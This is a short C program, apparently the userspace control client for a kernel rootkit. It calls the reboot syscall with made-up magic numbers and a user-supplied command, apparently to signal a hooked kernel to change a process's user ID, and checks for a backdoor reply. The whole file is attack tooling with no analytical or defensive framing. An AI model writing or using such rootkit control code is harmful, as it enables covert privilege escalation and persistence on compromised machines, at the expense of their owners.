#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdint.h>

int main(int argc, char *argv[]) {
	if (argc != 2) {
		const char *error = "Usage: ./change_uid <uid>\n";
		syscall(SYS_write, 2, error, strlen(error));
		return 1;
	}

	int magic1 = 0xDEADBEEF;
	int magic2 = 10006;
	unsigned int cmd = strtoul(argv[1], NULL, 0);
	uintptr_t arg;

	printf("SYS_reboot(0x%x, %d, %u, %p)\n", magic1, magic2, cmd, (void *)&arg);
	syscall(SYS_reboot, magic1, magic2, cmd, (void *)&arg);

	// if our arg contains our pointer then its good
	printf("reply: 0x%lx verdict: %s\n", *(uintptr_t *)arg, *(uintptr_t *)arg == (uintptr_t)arg ? "ok" : "fail" );
	
	return 0;

}
